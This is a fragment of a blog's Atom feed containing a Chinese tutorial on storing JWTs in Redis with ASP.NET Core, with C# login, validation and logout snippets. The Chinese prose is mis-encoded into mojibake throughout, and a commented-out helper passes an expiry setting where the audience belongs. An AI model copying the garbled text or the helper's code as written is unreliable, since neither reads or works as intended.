.url-img{width:120px;height:100px;-webkit-box-flex:0;-ms-flex:none;flex:none;background:rgba(255, 255, 255, 0);display:flex;align-items:center;overflow:hidden}.url-card .url-img>img{max-height:100%;vertical-align:unset}.url-card .max .url-img{width:60px;height:60px}.url-card .mini .url-img{width:25px;height:25px}.url-card .post-min .url-img{width:20px;height:20px}.url-card .post-min .url-img>img{vertical-align:unset}.url-card.wechat a.card:after{content:'\e60d';position:absolute;display:inline-block;font-family:"iconfont";font-size:66px;color:#888;margin-left:10px;bottom:-15px;right:10px;opacity:.15}.url-card.down a.card:after{content:'\e604';position:absolute;display:inline-block;font-family:"iconfont";font-size:60px;color:#888;margin-left:10px;bottom:-10px;right:10px;opacity:.15}.url-card.down .mini a.card:after,.url-card.wechat .mini a.card:after{font-size:30px;margin-left:10px;bottom:-5px;right:10px}.url-card.down .max a.card:after,.url-card.wechat .max a.card:after{font-size:30px;bottom:25px}.url-card .mini a.togo,.url-card .default a.togo{position:absolute;top:20px;right:0;width:30px;height:30px;line-height:30px;opacity:.2;transition:opacity .3s} .url-card .mini a.togo{top:4px}.url-card .url-body:hover a.togo{opacity:1}.url-card .max a.togo{margin-left:auto}.url-card .max .tga{width:calc(100% - 15px);overflow:hidden}.url-card .max .tga a{font-size:75%;padding:.125rem .4rem;background:rgba(134,134,134,.1);color:#888;border-radius:10px;transition:.3s}.url-card .max .tga a:not(.no-tag):hover{background:#f1404b;color:#fff}.home-like{cursor:pointer}.home-like:hover{color:#f1404b}.home-like-hide{opacity:0!important;transform:scale(3) translateY(-25px)!important}.url-card a.togo:hover i{text-shadow:0 0 5px} .panel-body .url-card.shortcode-url .card{background:rgba(136,136,136,.1)}.url-card .remove-site,.url-card .remove-cm-site{position:absolute;top:-8px;right:0;font-size:20px;color:#f1404b;line-height:20px}.url-card .mini .card-body{padding:0.4rem 0.5rem}.edit .url-card.sortable{cursor:move}.edit .url-card.sortable .url-body a{pointer-events:none}.edit .url-card.sortable .url-body:hover{transform:initial;box-shadow:initial}.article-entry p, .article-entry table{margin:0}.keep-markdown-body a{    border-bottom: 0rem solid var(--text-color-4);}.mb-4{flex-direction: row-reverse;}.keep-markdown-body img{box-shadow:0 0 0xrem var(--shadow-color)}.post-content-container .border-box{background:#B6E0F9;}     </style>]]></content>
    
    
      
      
    <summary type="html">&lt;div&gt;
&lt;a href=&quot;#Study&quot;&gt;Study&lt;/a&gt;
&lt;a href=&quot;#Tools&quot;&gt;Tools&lt;/a&gt;
&lt;a href=&quot;#AI&quot;&gt;AI&lt;/a&gt;
&lt;a href=&quot;#Hexo&quot;&gt;Hexo&lt;/a&gt;
&lt;a href=&quot;#Fun&quot;&gt;Fun&lt;/a&gt;
&lt;a href=&quot;#G</summary>
      
    
    
    
    <category term="æŠ€æœ¯" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="Navigation" scheme="https://banjinmei.github.io/tags/Navigation/"/>
    
    <category term="nav" scheme="https://banjinmei.github.io/tags/nav/"/>
    
  </entry>
  
  <entry>
    <title>jwt redis</title>
    <link href="https://banjinmei.github.io/2024/12/03/jwt-redis/"/>
    <id>https://banjinmei.github.io/2024/12/03/jwt-redis/</id>
    <published>2024-12-02T17:20:03.000Z</published>
    <updated>2024-12-03T18:10:52.214Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Redis-JWT"><a href="#Redis-JWT" class="headerlink" title="Redis JWT"></a>Redis JWT</h1><p>åœ¨ .NET ä¸­ä½¿ç”¨ Redis æ¥å­˜å‚¨ JWTï¼ˆJSON Web Tokenï¼‰å¯ä»¥é€šè¿‡å¤šç§æ–¹å¼å®ç°ï¼Œ<br>ä¾‹å¦‚åœ¨ç”¨æˆ·ç™»å½•æ—¶å°†ç”Ÿæˆçš„ JWT å­˜å‚¨åœ¨ Redis ä¸­ä»¥ä¾¿äºåç»­éªŒè¯å’Œç®¡ç†ã€‚</p><p>å®ç°æ­¥éª¤</p><h1 id="å¼•å…¥ä¾èµ–"><a href="#å¼•å…¥ä¾èµ–" class="headerlink" title="å¼•å…¥ä¾èµ–"></a>å¼•å…¥ä¾èµ–</h1><p>ç¡®ä¿ä½ çš„é¡¹ç›®å¼•å…¥äº†ä»¥ä¸‹å¿…è¦çš„ NuGet åŒ…ï¼š</p><p>Microsoft.AspNetCore.Authentication.JwtBearerï¼šç”¨äº JWT èº«ä»½éªŒè¯ã€‚<br>StackExchange.Redisï¼šç”¨äºä¸ Redis é€šä¿¡ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dotnet add package Microsoft.AspNetCore.Authentication.JwtBearer</span><br><span class="line">dotnet add package StackExchange.Redis</span><br></pre></td></tr></table></figure><h1 id="é…ç½®-Redis-å®¢æˆ·ç«¯"><a href="#é…ç½®-Redis-å®¢æˆ·ç«¯" class="headerlink" title="é…ç½® Redis å®¢æˆ·ç«¯"></a>é…ç½® Redis å®¢æˆ·ç«¯</h1><p>è®¾ç½® Redis çš„è¿æ¥å’Œæ“ä½œã€‚</p><h1 id="ç”Ÿæˆ-JWT"><a href="#ç”Ÿæˆ-JWT" class="headerlink" title="ç”Ÿæˆ JWT"></a>ç”Ÿæˆ JWT</h1><p>æ ¹æ®ç”¨æˆ·ä¿¡æ¯ç”Ÿæˆ JWT å¹¶å°†å…¶å­˜å‚¨åˆ° Redisã€‚</p><h1 id="éªŒè¯-JWT"><a href="#éªŒè¯-JWT" class="headerlink" title="éªŒè¯ JWT"></a>éªŒè¯ JWT</h1><p>åœ¨éªŒè¯é˜¶æ®µä» Redis æ£€æŸ¥ token æ˜¯å¦æœ‰æ•ˆã€‚</p><h1 id="å®ç°-Token-çš„å¤±æ•ˆæœºåˆ¶"><a href="#å®ç°-Token-çš„å¤±æ•ˆæœºåˆ¶" class="headerlink" title="å®ç° Token çš„å¤±æ•ˆæœºåˆ¶"></a>å®ç° Token çš„å¤±æ•ˆæœºåˆ¶</h1><p>åˆ©ç”¨ Redis çš„ TTLï¼ˆè¿‡æœŸæ—¶é—´ï¼‰ç‰¹æ€§æ¥ç®¡ç† token çš„ç”Ÿå‘½å‘¨æœŸã€‚</p><h1 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h1><h2 id="1-é…ç½®-Redis-å®¢æˆ·ç«¯"><a href="#1-é…ç½®-Redis-å®¢æˆ·ç«¯" class="headerlink" title="1. é…ç½® Redis å®¢æˆ·ç«¯"></a>1. é…ç½® Redis å®¢æˆ·ç«¯</h2><p>åœ¨ Program.cs æˆ– Startup.cs ä¸­é…ç½® Redis å’Œ JWT èº«ä»½éªŒè¯ï¼š</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Microsoft.AspNetCore.Authentication.JwtBearer;</span><br><span class="line"><span class="keyword">using</span> Microsoft.Extensions.DependencyInjection;</span><br><span class="line"><span class="keyword">using</span> Microsoft.IdentityModel.Tokens;</span><br><span class="line"><span class="keyword">using</span> StackExchange.Redis;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> builder = WebApplication.CreateBuilder(args);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Redis é…ç½®</span></span><br><span class="line">builder.Services.AddSingleton&lt;IConnectionMultiplexer&gt;(sp =&gt;</span><br><span class="line">    ConnectionMultiplexer.Connect(<span class="string">&quot;localhost:6379&quot;</span>)); <span class="comment">// æ›¿æ¢ä¸ºä½ çš„ Redis åœ°å€</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// JWT é…ç½®</span></span><br><span class="line"><span class="keyword">var</span> key = <span class="string">&quot;YourSecretKeyForJwt&quot;</span>; <span class="comment">// æ›¿æ¢ä¸ºä½ çš„å¯†é’¥</span></span><br><span class="line">builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)</span><br><span class="line">    .AddJwtBearer(options =&gt;</span><br><span class="line">    &#123;</span><br><span class="line">        options.TokenValidationParameters = <span class="keyword">new</span> TokenValidationParameters</span><br><span class="line">        &#123;</span><br><span class="line">            ValidateIssuerSigningKey = <span class="literal">true</span>,</span><br><span class="line">            IssuerSigningKey = <span class="keyword">new</span> SymmetricSecurityKey(Encoding.UTF8.GetBytes(key)),</span><br><span class="line">            ValidateIssuer = <span class="literal">false</span>,</span><br><span class="line">            ValidateAudience = <span class="literal">false</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">builder.Services.AddAuthorization();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = builder.Build();</span><br><span class="line">app.UseAuthentication();</span><br><span class="line">app.UseAuthorization();</span><br><span class="line"></span><br><span class="line">app.MapControllers();</span><br><span class="line"></span><br><span class="line">app.Run();</span><br></pre></td></tr></table></figure><h2 id="2-ç”Ÿæˆå’Œå­˜å‚¨-JWT"><a href="#2-ç”Ÿæˆå’Œå­˜å‚¨-JWT" class="headerlink" title="2. ç”Ÿæˆå’Œå­˜å‚¨ JWT"></a>2. ç”Ÿæˆå’Œå­˜å‚¨ JWT</h2><p>åœ¨ Controller ä¸­ç”Ÿæˆ JWT å¹¶å°†å…¶å­˜å‚¨åˆ° Redisã€‚</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Microsoft.AspNetCore.Mvc;</span><br><span class="line"><span class="keyword">using</span> Microsoft.IdentityModel.Tokens;</span><br><span class="line"><span class="keyword">using</span> StackExchange.Redis;</span><br><span class="line"><span class="keyword">using</span> System.IdentityModel.Tokens.Jwt;</span><br><span class="line"><span class="keyword">using</span> System.Security.Claims;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line">[<span class="meta">ApiController</span>]</span><br><span class="line">[<span class="meta">Route(<span class="string">&quot;api/[controller]&quot;</span>)</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">AuthController</span> : <span class="title">ControllerBase</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> IConnectionMultiplexer _redis;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> <span class="built_in">string</span> _jwtKey = <span class="string">&quot;YourSecretKeyForJwt&quot;</span>; <span class="comment">// æ›¿æ¢ä¸ºä½ çš„å¯†é’¥</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AuthController</span>(<span class="params">IConnectionMultiplexer redis</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        _redis = redis;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">HttpPost(<span class="string">&quot;login&quot;</span>)</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> IActionResult <span class="title">Login</span>(<span class="params"><span class="built_in">string</span> username</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// åˆ›å»º JWT token</span></span><br><span class="line">        <span class="keyword">var</span> claims = <span class="keyword">new</span>[]</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">new</span> Claim(ClaimTypes.Name, username)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> key = <span class="keyword">new</span> SymmetricSecurityKey(Encoding.UTF8.GetBytes(_jwtKey));</span><br><span class="line">        <span class="keyword">var</span> creds = <span class="keyword">new</span> SigningCredentials(key, SecurityAlgorithms.HmacSha256);</span><br><span class="line">        <span class="keyword">var</span> token = <span class="keyword">new</span> JwtSecurityToken(</span><br><span class="line">            claims: claims,</span><br><span class="line">            expires: DateTime.UtcNow.AddHours(<span class="number">1</span>),</span><br><span class="line">            signingCredentials: creds);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> jwt = <span class="keyword">new</span> JwtSecurityTokenHandler().WriteToken(token);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å°† token å­˜å‚¨åˆ° Redis</span></span><br><span class="line">        <span class="keyword">var</span> db = _redis.GetDatabase();</span><br><span class="line">        db.StringSet(<span class="string">$&quot;jwt:<span class="subst">&#123;username&#125;</span>&quot;</span>, jwt, TimeSpan.FromHours(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Ok(<span class="keyword">new</span> &#123; token = jwt &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-éªŒè¯-JWT"><a href="#3-éªŒè¯-JWT" class="headerlink" title="3. éªŒè¯ JWT"></a>3. éªŒè¯ JWT</h2><p>åœ¨ä¸­é—´ä»¶æˆ–éªŒè¯é€»è¾‘ä¸­ä» Redis æ£€æŸ¥ JWT æ˜¯å¦æœ‰æ•ˆã€‚</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">HttpGet(<span class="string">&quot;validate&quot;</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> IActionResult <span class="title">ValidateToken</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> authHeader = Request.Headers[<span class="string">&quot;Authorization&quot;</span>].ToString();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">string</span>.IsNullOrEmpty(authHeader) || !authHeader.StartsWith(<span class="string">&quot;Bearer &quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> Unauthorized();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> token = authHeader.Replace(<span class="string">&quot;Bearer &quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> username = User.Identity?.Name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> db = _redis.GetDatabase();</span><br><span class="line">    <span class="keyword">var</span> storedToken = db.StringGet(<span class="string">$&quot;jwt:<span class="subst">&#123;username&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (storedToken.IsNullOrEmpty || storedToken != token)</span><br><span class="line">        <span class="keyword">return</span> Unauthorized();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Ok(<span class="string">&quot;Token is valid&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-Token-å¤±æ•ˆæœºåˆ¶"><a href="#4-Token-å¤±æ•ˆæœºåˆ¶" class="headerlink" title="4. Token å¤±æ•ˆæœºåˆ¶"></a>4. Token å¤±æ•ˆæœºåˆ¶</h2><p>åˆ©ç”¨ Redis çš„ TTL è®¾ç½® token çš„è‡ªåŠ¨è¿‡æœŸï¼š</p><p>åœ¨å­˜å‚¨ token æ—¶è®¾ç½®è¿‡æœŸæ—¶é—´ã€‚<br>ç”¨æˆ·æ³¨é”€æ—¶å¯ä»¥æ‰‹åŠ¨åˆ é™¤ Redis ä¸­çš„ tokenã€‚<br>æ³¨é”€ç¤ºä¾‹ï¼š</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">HttpPost(<span class="string">&quot;logout&quot;</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> IActionResult <span class="title">Logout</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> username = User.Identity?.Name;</span><br><span class="line">    <span class="keyword">var</span> db = _redis.GetDatabase();</span><br><span class="line">    db.KeyDelete(<span class="string">$&quot;jwt:<span class="subst">&#123;username&#125;</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> Ok(<span class="string">&quot;Logged out&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>é€šè¿‡ Redis å­˜å‚¨ JWTï¼Œå¯ä»¥å®ç°ä»¥ä¸‹åŠŸèƒ½ï¼š</p><p>é›†ä¸­ç®¡ç† JWTï¼šä¾¿äºå®æ—¶æ’¤é”€æˆ–æŸ¥è¯¢ã€‚<br>è‡ªåŠ¨è¿‡æœŸï¼šRedis è‡ªå¸¦ TTLï¼Œå¯ä»¥ç®€åŒ– token çš„ç®¡ç†ã€‚<br>æ‰©å±•æ€§å¥½ï¼šé€‚ç”¨äºåˆ†å¸ƒå¼ç³»ç»Ÿã€‚<br>æ ¹æ®å®é™…éœ€æ±‚ï¼Œè¿˜å¯ä»¥æ‰©å±•åŠŸèƒ½ï¼Œä¾‹å¦‚é»‘åå•æœºåˆ¶æˆ–æ”¯æŒå¤šè®¾å¤‡ç™»å½•ç­‰ã€‚</p><!-- <figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">JwtHelper</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> IConfiguration _configuration;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> IDatabase _redisDatabase;</span><br><span class="line"></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> Tokené…ç½®</span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name=&quot;configuration&quot;&gt;</span><span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">JwtHelper</span>(<span class="params">IConfiguration configuration</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        _configuration = configuration;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è¿æ¥Rediså¹¶è·å–æ•°æ®åº“å®ä¾‹ï¼Œè¿™é‡Œå‡è®¾ä½¿ç”¨é»˜è®¤é…ç½®å’Œæ•°æ®åº“ç´¢å¼•0</span></span><br><span class="line">        <span class="keyword">var</span> redis = ConnectionMultiplexer.Connect(_configuration[<span class="string">&quot;Redis:ConnectionString&quot;</span>]);</span><br><span class="line">        _redisDatabase = redis.GetDatabase();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> åˆ›å»ºTokenå¹¶å°†å…¶å­˜å‚¨åˆ°Redisä¸­ï¼Œè¿™é‡Œé¢å¯ä»¥ä¿å­˜è‡ªå·±æƒ³è¦çš„ä¿¡æ¯</span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name=&quot;username&quot;&gt;</span><span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name=&quot;uid&quot;&gt;</span><span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;returns&gt;</span><span class="doctag">&lt;/returns&gt;</span></span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="built_in">string</span> <span class="title">CreateTokenIDAndStoreInRedis</span>(<span class="params"><span class="built_in">string</span> username, <span class="built_in">string</span> uid</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        DateTime dt1 = DateTime.Now;</span><br><span class="line">        DateTime dt2 = DateTime.Now.AddHours(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 1. å®šä¹‰éœ€è¦ä½¿ç”¨åˆ°çš„Claims</span></span><br><span class="line">            <span class="keyword">var</span> claims = <span class="keyword">new</span>[]</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">new</span> Claim(<span class="string">&quot;username&quot;</span>, username),</span><br><span class="line">                <span class="keyword">new</span> Claim(<span class="string">&quot;uid&quot;</span>, uid),</span><br><span class="line">                <span class="comment">/* å¯ä»¥ä¿å­˜è‡ªå·±æƒ³è¦ä¿¡æ¯ï¼Œä¼ å‚è¿›æ¥å³å¯</span></span><br><span class="line"><span class="comment">                new Claim(&quot;sex&quot;, &quot;sex&quot;),</span></span><br><span class="line"><span class="comment">                new Claim(&quot;limit&quot;, &quot;limit&quot;),</span></span><br><span class="line"><span class="comment">                new Claim(&quot;head_url&quot;, &quot;xxxxx&quot;)</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="comment">// 2. ä» appsettings.json ä¸­è¯»å–SecretKey</span></span><br><span class="line">            <span class="keyword">var</span> secretKey = <span class="keyword">new</span> SymmetricSecurityKey(Encoding.UTF8.GetBytes(_configuration[<span class="string">&quot;Jwt:SecKey&quot;</span>]));</span><br><span class="line">            <span class="comment">// 3. é€‰æ‹©åŠ å¯†ç®—æ³•</span></span><br><span class="line">            <span class="keyword">var</span> algorithm = SecurityAlgorithms.HmacSha256;</span><br><span class="line">            <span class="comment">// 4. ç”ŸæˆCredentials</span></span><br><span class="line">            <span class="keyword">var</span> signingCredentials = <span class="keyword">new</span> SigningCredentials(secretKey, algorithm);</span><br><span class="line">            <span class="comment">// 5. æ ¹æ®ä»¥ä¸Šï¼Œç”Ÿæˆtoken</span></span><br><span class="line">            <span class="keyword">var</span> jwtSecurityToken = <span class="keyword">new</span> JwtSecurityToken(</span><br><span class="line">                _configuration[<span class="string">&quot;Jwt:Issuer&quot;</span>],    <span class="comment">//Issuer</span></span><br><span class="line">                _configuration[<span class="string">&quot;Jwt:ExpireSeconds&quot;</span>],  <span class="comment">//ExpireSeconds</span></span><br><span class="line">                claims,                          <span class="comment">//Claims,</span></span><br><span class="line">                dt1,                    <span class="comment">//notBefore</span></span><br><span class="line">                dt2,     <span class="comment">//expires</span></span><br><span class="line">                signingCredentials               <span class="comment">//Credentials</span></span><br><span class="line">            );</span><br><span class="line">            <span class="comment">// 6. å°†tokenå˜ä¸ºstring</span></span><br><span class="line">            <span class="keyword">var</span> token = <span class="keyword">new</span> JwtSecurityTokenHandler().WriteToken(jwtSecurityToken);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// å°†ç”Ÿæˆçš„JWTå­˜å‚¨åˆ°Redisä¸­ï¼Œä»¥uidä½œä¸ºé”®ï¼Œè®¾ç½®è¿‡æœŸæ—¶é—´ä¸ºJWTçš„æœ‰æ•ˆæœŸ</span></span><br><span class="line">            <span class="keyword">var</span> expirationSeconds = (dt2 - dt1).TotalSeconds;</span><br><span class="line">            _redisDatabase.StringSet(uid, token, TimeSpan.FromSeconds(expirationSeconds));</span><br><span class="line"></span><br><span class="line">            <span class="comment"><span class="doctag">///</span>/ log tktklogtk</span></span><br><span class="line">            <span class="comment">//Console.WriteLine(&quot;userlogin &quot; + username + &quot; ID &quot; + uid + &quot; &quot; + dt1 + &quot; ~ &quot; + dt2 + &quot;  &quot; + token);</span></span><br><span class="line">            <span class="keyword">return</span> token;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> ä»Redisä¸­è¯»å–JWTå¹¶è§£å¯†è·å–ä¿¡æ¯</span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name=&quot;uid&quot;&gt;</span><span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;returns&gt;</span><span class="doctag">&lt;/returns&gt;</span></span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="built_in">string</span> <span class="title">ReadAndDecryptTokenFromRedis</span>(<span class="params"><span class="built_in">string</span> uid</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> token = _redisDatabase.StringGet(uid);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">string</span>.IsNullOrEmpty(token))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> JWToken = JwtDecrypt(token);</span><br><span class="line">            <span class="keyword">return</span> JWToken;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">string</span>.Empty;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä»¥ä¸‹æ˜¯åŸæœ‰çš„æ–¹æ³•ï¼Œå¦‚CreateTokenã€ReaderTokenã€GetUidã€JwtDecryptç­‰æ–¹æ³•ä¿æŒä¸å˜ï¼Œæ­¤å¤„çœç•¥é‡å¤ä»£ç å±•ç¤º</span></span><br><span 